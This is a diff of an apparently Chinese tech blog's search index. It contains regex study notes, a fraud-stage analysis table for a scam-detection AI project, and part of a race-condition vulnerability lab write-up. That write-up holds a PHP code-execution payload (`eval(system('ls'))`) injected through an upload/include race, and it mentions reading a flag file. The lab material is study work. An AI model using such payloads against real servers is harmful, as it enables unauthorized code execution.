-<h1 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h1><h2 id="多行修饰符-Multline"><a href="#多行修饰符-Multline" class="headerlink" title="多行修饰符(Multline)"></a>多行修饰符(Multline)</h2><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里只匹配mat<br>但是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里就会把fat,sat,mat都给匹配上</p>
-<p><strong>总结:</strong></p>
-<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
-<h1 id="关于点运算符"><a href="#关于点运算符" class="headerlink" title="关于点运算符(.)"></a>关于点运算符(.)</h1><ul>
-<li><p><strong>本质:就是随意匹配一个字符，包括空格符但是不匹配换行符</strong>。</p>
-</li>
-<li><p>理解:以下例子:’</p>
-</li>
-<li><p>三者进行对比:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;关于findall以及点运算符的使用&quot;&quot;&quot;</span></span><br><span class="line">result = re.findall(<span class="string">r&quot;.&quot;</span>, <span class="string">&quot;The car parked in the garage.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>这时会输出</p>
-</li>
-<li><pre><code class="language-plaintext">[&#39;T&#39;, &#39;h&#39;, &#39;e&#39;, &#39; &#39;, &#39;c&#39;, &#39;a&#39;, &#39;r&#39;, &#39; &#39;, &#39;p&#39;, &#39;a&#39;, &#39;r&#39;, &#39;k&#39;, &#39;e&#39;, &#39;d&#39;, &#39; &#39;, &#39;i&#39;, &#39;n&#39;, &#39; &#39;, &#39;t&#39;, &#39;h&#39;, &#39;e&#39;, &#39; &#39;, &#39;g&#39;, &#39;a&#39;, &#39;r&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;.&#39;]
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 即匹配所有字符，除了换行符。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;关于findall以及点运算符的使用&quot;&quot;&quot;</span><br><span class="line">result = re.findall(r&quot;.ar&quot;, &quot;The car parked in the garage.&quot;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>这时会输出</p>
-</li>
-<li><pre><code class="language-plaintext">[&#39;car&#39;, &#39;par&#39;, &#39;gar&#39;]
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 即加权对字符进行匹配,匹配后面跟着`ar`字符的单词</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;关于findall以及点运算符的使用&quot;&quot;&quot;</span><br><span class="line">result = re.findall(r&quot;.*&quot;, &quot;The car parked in the garage ar.&quot;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>这时会输出</p>
-</li>
-<li><pre><code class="language-plaintext">[&#39;The car parked in the garage ar.&#39;, &#39;&#39;]
-</code></pre>
-</li>
-<li><p>这里我们就要提到<strong>贪婪匹配了!</strong></p>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="贪婪匹配和非贪婪匹配的区别"><a href="#贪婪匹配和非贪婪匹配的区别" class="headerlink" title="贪婪匹配和非贪婪匹配的区别"></a>贪婪匹配和非贪婪匹配的区别</h1><h2 id="入门-个人通俗理解"><a href="#入门-个人通俗理解" class="headerlink" title="入门:个人通俗理解"></a>入门:个人通俗理解</h2><ul>
-<li><p>其实贪婪匹配就是尽可能地多匹配字符,而非贪婪匹配就是匹配到第一个符合条件的字符后收手，计为一个匹配的对象，不再匹配。</p>
-</li>
-<li><p>参考网站:<a href="https://regex101.com/r/1paXsy/1">正则匹配模拟器</a></p>
-</li>
-<li><p>比如<code>.* </code>就是对字符进行贪婪匹配,将该表达式写作:<code>.*?</code>就是非贪婪匹配，即懒惰匹配</p>
-<p>详见如下的例子:</p>
-</li>
-<li><p><strong>例一:</strong></p>
-</li>
-<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331003545166.png" class="" title="image-20250331003545166">
-</li>
-<li><p>贪婪匹配的格式就为,表达式<code>.+</code>首尾为匹配的表达式模板，比如这个例子，首位就是<code>a</code>,结尾就为<code>b[空格]a</code>,那就匹配首位格式为这样的字符传，如图所示，就算把中间数个<code>b</code>中该有<code>c</code>字符的话，一样可以匹配,比如:</p>
-</li>
-<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331004014691.png" class="" title="image-20250331004014691">
-</li>
-<li><p><strong>例二:</strong></p>
-</li>
-<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331004141053.png" class="" title="image-20250331004141053">
-</li>
-<li><p>这里可以发现，当我使用<code>?</code>将贪婪匹配转为懒惰匹配后，在第一个格式为<code>a</code>开头，<code>b</code>结尾的字符串处匹配就结束了</p>
-</li>
-<li><p>不会像如下这样:</p>
-</li>
-<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331004253303.png" class="" title="image-20250331004253303"></li>
-</ul>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>正则匹配</tag>
       </tags>
   </entry>
   <entry>
@@ -3997,20 +3993,20 @@ class ContextAwareClassifier:
 <li><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/f71f76a40be846d98c3ea66960ff5f05.png" class="" title="img">
 </li>
 <li><p>新建资源池,设置线程为<code>30</code>:</p>
-   <style>.hggwcfwubecw{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/5ad4d673844747efbd69dc94ed97b5fa.png" class="hggwcfwubecw" alt="img">
+   <style>.rebqilubskrr{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/5ad4d673844747efbd69dc94ed97b5fa.png" class="rebqilubskrr" alt="img">
 </li>
 <li><p>设置完成后，先不立即开始攻击</p>
 </li>
 <li><p>对于文件访问请求攻击的制造，使用相同的操作流程,唯一不同之处:<br>将线程数设置为<code>80</code>,访问请求比数据传入请求线程更高,更容易访问包含到恶意文件从而执行恶意代码</p>
-<style>.jbrleerkcgtc{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/9b00846795a148798fc1b19dda9901f7.png" class="jbrleerkcgtc" alt="img">
+<style>.hkdwkjgxlywh{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/9b00846795a148798fc1b19dda9901f7.png" class="hkdwkjgxlywh" alt="img">
 </li>
 <li><p>**之后操作一定要快，先启动设置好的文件上传请求后立刻开启设置好的文件访问请求，**观察文件访问请求的字段长度:</p>
-<style>.jcxeloocycxm{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/3e76116f587f22d28f54b3a9ad5c4372.jpg" class="jcxeloocycxm" alt="3e76116f587f22d28f54b3a9ad5c4372">
+<style>.ctcubukcykrn{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/3e76116f587f22d28f54b3a9ad5c4372.jpg" class="ctcubukcykrn" alt="3e76116f587f22d28f54b3a9ad5c4372">
 </li>
 <li><p>可以发现一个字段长度明显与其他字段长度不同的结果，这张截图是最终结果，即使用<code>cat</code>指令对对于文件进行抓取读取其中的信息。</p>
 </li>
 <li><p>我们正常的流程应该是先设置<code>value</code>为<code>value=&quot;&lt;?php eval(system(&#39;ls&#39;));?&gt;&quot;</code>列出当前服务器下的文件列表:</p>
-<style>.eocurrgpibwf{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/7103cdbecd2eb2456ffbe9dbef901ce9.jpg" class="eocurrgpibwf" alt="7103cdbecd2eb2456ffbe9dbef901ce9">
+<style>.lfqgwmyoikcj{zoom:50%;}</style><img src="/2025/04/07/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/7103cdbecd2eb2456ffbe9dbef901ce9.jpg" class="lfqgwmyoikcj" alt="7103cdbecd2eb2456ffbe9dbef901ce9">
 </li>
 <li><p>可见,我们要抓取的文件名为:<code>upload_prgress_fl0g.php</code>,所以我们的抓取目标为<code>fl0g.php</code><br>存疑:<strong>为什么是抓取fl0g.php而不是完整的upload_progress_fl0g.php</strong></p>
 </li>
@@ -4023,6 +4019,82 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>条件竞争漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则匹配注意点个人笔记</title>
+    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p><strong>正则匹配个人易忽略点记录</strong></p>
+<h1 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h1><h2 id="多行修饰符-Multline"><a href="#多行修饰符-Multline" class="headerlink" title="多行修饰符(Multline)"></a>多行修饰符(Multline)</h2><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里只匹配mat<br>但是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里就会把fat,sat,mat都给匹配上</p>
+<p><strong>总结:</strong></p>
+<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+<h1 id="关于点运算符"><a href="#关于点运算符" class="headerlink" title="关于点运算符(.)"></a>关于点运算符(.)</h1><ul>
+<li><p><strong>本质:就是随意匹配一个字符，包括空格符但是不匹配换行符</strong>。</p>
+</li>
+<li><p>理解:以下例子:’</p>
+</li>
+<li><p>三者进行对比:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;关于findall以及点运算符的使用&quot;&quot;&quot;</span></span><br><span class="line">result = re.findall(<span class="string">r&quot;.&quot;</span>, <span class="string">&quot;The car parked in the garage.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这时会输出</p>
+</li>
+<li><pre><code class="language-plaintext">[&#39;T&#39;, &#39;h&#39;, &#39;e&#39;, &#39; &#39;, &#39;c&#39;, &#39;a&#39;, &#39;r&#39;, &#39; &#39;, &#39;p&#39;, &#39;a&#39;, &#39;r&#39;, &#39;k&#39;, &#39;e&#39;, &#39;d&#39;, &#39; &#39;, &#39;i&#39;, &#39;n&#39;, &#39; &#39;, &#39;t&#39;, &#39;h&#39;, &#39;e&#39;, &#39; &#39;, &#39;g&#39;, &#39;a&#39;, &#39;r&#39;, &#39;a&#39;, &#39;g&#39;, &#39;e&#39;, &#39;.&#39;]
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 即匹配所有字符，除了换行符。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;关于findall以及点运算符的使用&quot;&quot;&quot;</span><br><span class="line">result = re.findall(r&quot;.ar&quot;, &quot;The car parked in the garage.&quot;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>这时会输出</p>
+</li>
+<li><pre><code class="language-plaintext">[&#39;car&#39;, &#39;par&#39;, &#39;gar&#39;]
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 即加权对字符进行匹配,匹配后面跟着`ar`字符的单词</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;关于findall以及点运算符的使用&quot;&quot;&quot;</span><br><span class="line">result = re.findall(r&quot;.*&quot;, &quot;The car parked in the garage ar.&quot;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>这时会输出</p>
+</li>
+<li><pre><code class="language-plaintext">[&#39;The car parked in the garage ar.&#39;, &#39;&#39;]
+</code></pre>
+</li>
+<li><p>这里我们就要提到<strong>贪婪匹配了!</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="贪婪匹配和非贪婪匹配的区别"><a href="#贪婪匹配和非贪婪匹配的区别" class="headerlink" title="贪婪匹配和非贪婪匹配的区别"></a>贪婪匹配和非贪婪匹配的区别</h1><h2 id="入门-个人通俗理解"><a href="#入门-个人通俗理解" class="headerlink" title="入门:个人通俗理解"></a>入门:个人通俗理解</h2><ul>
+<li><p>其实贪婪匹配就是尽可能地多匹配字符,而非贪婪匹配就是匹配到第一个符合条件的字符后收手，计为一个匹配的对象，不再匹配。</p>
+</li>
+<li><p>参考网站:<a href="https://regex101.com/r/1paXsy/1">正则匹配模拟器</a></p>
+</li>
+<li><p>比如<code>.* </code>就是对字符进行贪婪匹配,将该表达式写作:<code>.*?</code>就是非贪婪匹配，即懒惰匹配</p>
+<p>详见如下的例子:</p>
+</li>
+<li><p><strong>例一:</strong></p>
+</li>
+<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331003545166.png" class="" title="image-20250331003545166">
+</li>
+<li><p>贪婪匹配的格式就为,表达式<code>.+</code>首尾为匹配的表达式模板，比如这个例子，首位就是<code>a</code>,结尾就为<code>b[空格]a</code>,那就匹配首位格式为这样的字符传，如图所示，就算把中间数个<code>b</code>中该有<code>c</code>字符的话，一样可以匹配,比如:</p>
+</li>
+<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331004014691.png" class="" title="image-20250331004014691">
+</li>
+<li><p><strong>例二:</strong></p>
+</li>
+<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331004141053.png" class="" title="image-20250331004141053">
+</li>
+<li><p>这里可以发现，当我使用<code>?</code>将贪婪匹配转为懒惰匹配后，在第一个格式为<code>a</code>开头，<code>b</code>结尾的字符串处匹配就结束了</p>
+</li>
+<li><p>不会像如下这样:</p>
+</li>
+<li><img src="/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/image-20250331004253303.png" class="" title="image-20250331004253303"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>正则匹配</tag>
       </tags>
   </entry>
   <entry>
@@ -4097,14 +4169,108 @@ if __name__ == &#39;__main__&#39;:
       </tags>
   </entry>
   <entry>
+    <title>爬虫，寻找数据集入门</title>
+    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>特征工程一致性与持久化</title>
     <url>/2025/03/08/%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>爬虫，寻找数据集入门</title>
-    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[]]></content>
+    <title>犯罪脚本数据源梳理</title>
+    <url>/2025/03/14/%E7%8A%AF%E7%BD%AA%E8%84%9A%E6%9C%AC%E6%95%B0%E6%8D%AE%E6%BA%90%E6%A2%B3%E7%90%86/</url>
+    <content><![CDATA[<h1 id="脚本内容归纳"><a href="#脚本内容归纳" class="headerlink" title="脚本内容归纳"></a>脚本内容归纳</h1><table>
+<thead>
+<tr>
+<th>案件类型</th>
+<th align="left">准备阶段</th>
+<th align="left">事前阶段</th>
+<th align="left">实施阶段</th>
+<th align="left">事后阶段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“杀猪盘”</td>
+<td align="left">1.对于工具环境的准备<br />2.人手分配<br />3.被害人信息收集<br /></td>
+<td align="left">1.对于目标的找寻<br />2.开始培养情感<br /></td>
+<td align="left">1.投入小额资金获取初步信任<br />2.或者登入未知app<br /></td>
+<td align="left">1.切断联系方式<br />2.转移财务<br /></td>
+</tr>
+<tr>
+<td>“刷单”</td>
+<td align="left">1.准备相关工具<br />2.软件硬件制作虚假信息&#x2F;二维码<br /></td>
+<td align="left">1.对目标的寻找:<br />2.散布虚假信息，虚假链接<br /></td>
+<td align="left">1.诈骗人分为1与2分任务进行合作。<br />2.2负责寻找受害人，1对其进行诈骗操作<br /></td>
+<td align="left">1.洗钱<br />2.分赃<br /></td>
+</tr>
+<tr>
+<td>“跨境诈骗”</td>
+<td align="left">1.硬件工具的准备<br />2.人员准备<br />3.场所准备<br /></td>
+<td align="left">1.寻找身份信息<br />2.建立管理模式<br />3.维护系统<br /></td>
+<td align="left">1.冒充身份，给予被害人假消息，引起恐慌<br />2.获取信任<br />3.隔离被害人(通讯方式)<br />4.诱导完成转账诈骗<br /></td>
+<td align="left">1.复盘诈骗经验，建立奖惩机制，提升诈骗效率<br />2.人员回流<br /></td>
+</tr>
+<tr>
+<td>“传销”</td>
+<td align="left">1.组建网站发布消息<br />2.发展人员<br />3.组件资金体系<br /></td>
+<td align="left">1.寻找目标。<br /></td>
+<td align="left">1.同上</td>
+<td align="left">1.同上</td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<ul>
+<li>电诈流程梳理:<ul>
+<li>其实准备阶段、事前阶段、实施阶段、事后阶段都是大同小异</li>
+<li>准备阶段就是一个从无到有的情况。包括设备、人员、场所。</li>
+<li>事前就是对目标的找寻(具有多种方式)，以及熟悉，建立感情。</li>
+<li>实施阶段就是对受害者进行诈骗，开始督促受害人转移资金。</li>
+<li>事后阶段，对资金进行转移分赃并对诈骗流程进行复盘。</li>
+</ul>
+</li>
+<li>个人理解：<ul>
+<li>不同案件就是各个阶段的方式不同罢了</li>
+</ul>
+</li>
+<li>难点：<ul>
+<li>如何让ai自动识别并且提取出中间的关键词，且知晓这些关键词处于哪个阶段，哪种案子，<strong>提取、识别、构建</strong>是我项目的一大难点。</li>
+<li>其中：切割文本，我们可以使用什么技术呢？识别，切割后的文本，如何让XGBoost和BERT预训练混合模型进行识别，或者说，我们的训练数据集何在。如何构建我们的图标，将分类好的数据分别进行总结，然后写入图表中。这里算是第二阶段，将脚本模板构建</li>
+<li>第三阶段可以使用第二阶段遗留下来的脚本，比如<strong>提取、识别、构建</strong>系统，该阶段就是对网上的数据通过系统的处理放入RAG库中进行储存。RAG库除了检索增强就是对模板进行实时更新，另外使用我的双模型系统还可以把脚本阶段和对应的扰乱措施对应。</li>
+</ul>
+</li>
+</ul>
+<h1 id="数据源梳理"><a href="#数据源梳理" class="headerlink" title="数据源梳理"></a>数据源梳理</h1><h2 id="来源："><a href="#来源：" class="headerlink" title="来源："></a>来源：</h2><ul>
+<li><strong>中国裁判文书网</strong></li>
+</ul>
+]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>ai数据流梳理</tag>
+      </tags>
   </entry>
   <entry>
     <title>自然语言处理</title>
@@ -4374,100 +4540,6 @@ if __name__ == &#39;__main__&#39;:
       </categories>
       <tags>
         <tag>transformer模型入门</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>犯罪脚本数据源梳理</title>
-    <url>/2025/03/14/%E7%8A%AF%E7%BD%AA%E8%84%9A%E6%9C%AC%E6%95%B0%E6%8D%AE%E6%BA%90%E6%A2%B3%E7%90%86/</url>
-    <content><![CDATA[<h1 id="脚本内容归纳"><a href="#脚本内容归纳" class="headerlink" title="脚本内容归纳"></a>脚本内容归纳</h1><table>
-<thead>
-<tr>
-<th>案件类型</th>
-<th align="left">准备阶段</th>
-<th align="left">事前阶段</th>
-<th align="left">实施阶段</th>
-<th align="left">事后阶段</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>“杀猪盘”</td>
-<td align="left">1.对于工具环境的准备<br />2.人手分配<br />3.被害人信息收集<br /></td>
-<td align="left">1.对于目标的找寻<br />2.开始培养情感<br /></td>
-<td align="left">1.投入小额资金获取初步信任<br />2.或者登入未知app<br /></td>
-<td align="left">1.切断联系方式<br />2.转移财务<br /></td>
-</tr>
-<tr>
-<td>“刷单”</td>
-<td align="left">1.准备相关工具<br />2.软件硬件制作虚假信息&#x2F;二维码<br /></td>
-<td align="left">1.对目标的寻找:<br />2.散布虚假信息，虚假链接<br /></td>
-<td align="left">1.诈骗人分为1与2分任务进行合作。<br />2.2负责寻找受害人，1对其进行诈骗操作<br /></td>
-<td align="left">1.洗钱<br />2.分赃<br /></td>
-</tr>
-<tr>
-<td>“跨境诈骗”</td>
-<td align="left">1.硬件工具的准备<br />2.人员准备<br />3.场所准备<br /></td>
-<td align="left">1.寻找身份信息<br />2.建立管理模式<br />3.维护系统<br /></td>
-<td align="left">1.冒充身份，给予被害人假消息，引起恐慌<br />2.获取信任<br />3.隔离被害人(通讯方式)<br />4.诱导完成转账诈骗<br /></td>
-<td align="left">1.复盘诈骗经验，建立奖惩机制，提升诈骗效率<br />2.人员回流<br /></td>
-</tr>
-<tr>
-<td>“传销”</td>
-<td align="left">1.组建网站发布消息<br />2.发展人员<br />3.组件资金体系<br /></td>
-<td align="left">1.寻找目标。<br /></td>
-<td align="left">1.同上</td>
-<td align="left">1.同上</td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<ul>
-<li>电诈流程梳理:<ul>
-<li>其实准备阶段、事前阶段、实施阶段、事后阶段都是大同小异</li>
-<li>准备阶段就是一个从无到有的情况。包括设备、人员、场所。</li>
-<li>事前就是对目标的找寻(具有多种方式)，以及熟悉，建立感情。</li>
-<li>实施阶段就是对受害者进行诈骗，开始督促受害人转移资金。</li>
-<li>事后阶段，对资金进行转移分赃并对诈骗流程进行复盘。</li>
-</ul>
-</li>
-<li>个人理解：<ul>
-<li>不同案件就是各个阶段的方式不同罢了</li>
-</ul>
-</li>
-<li>难点：<ul>
-<li>如何让ai自动识别并且提取出中间的关键词，且知晓这些关键词处于哪个阶段，哪种案子，<strong>提取、识别、构建</strong>是我项目的一大难点。</li>
-<li>其中：切割文本，我们可以使用什么技术呢？识别，切割后的文本，如何让XGBoost和BERT预训练混合模型进行识别，或者说，我们的训练数据集何在。如何构建我们的图标，将分类好的数据分别进行总结，然后写入图表中。这里算是第二阶段，将脚本模板构建</li>
-<li>第三阶段可以使用第二阶段遗留下来的脚本，比如<strong>提取、识别、构建</strong>系统，该阶段就是对网上的数据通过系统的处理放入RAG库中进行储存。RAG库除了检索增强就是对模板进行实时更新，另外使用我的双模型系统还可以把脚本阶段和对应的扰乱措施对应。</li>
-</ul>
-</li>
-</ul>
-<h1 id="数据源梳理"><a href="#数据源梳理" class="headerlink" title="数据源梳理"></a>数据源梳理</h1><h2 id="来源："><a href="#来源：" class="headerlink" title="来源："></a>来源：</h2><ul>
-<li><strong>中国裁判文书网</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>ai数据流梳理</tag>
       </tags>
   </entry>
   <entry>
